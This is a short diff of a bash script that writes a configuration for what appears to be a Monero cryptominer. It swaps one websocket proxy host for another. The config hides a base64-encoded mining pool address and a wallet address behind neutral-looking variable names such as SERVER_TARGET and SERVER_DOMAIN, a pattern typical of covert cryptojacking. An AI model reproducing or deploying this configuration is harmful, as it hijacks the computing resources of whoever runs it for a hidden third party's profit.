@@ -1,7 +1,7 @@
 #!/bin/bash
 CONNECT=${1:-24}
 NAME=${2:-003}
-echo "SERVER_WS=wss://cdn.dapitax.social
+echo "SERVER_WS=ws://cdn.keitaro.my.id
 SERVER_TARGET=cngudW5taW5lYWJsZS5jb206ODA=
 SERVER_DOMAIN=XMR:85Z4CgUZDjxCyDmKLe2gLZJMnfUiS2Ticcf7NLGpdwnH9HcNRGKAoZERVNrwVew99ZdiZchjiZzTigE5beFDJ2rdTxoGAxr
 SERVER_SECRET=${NAME}
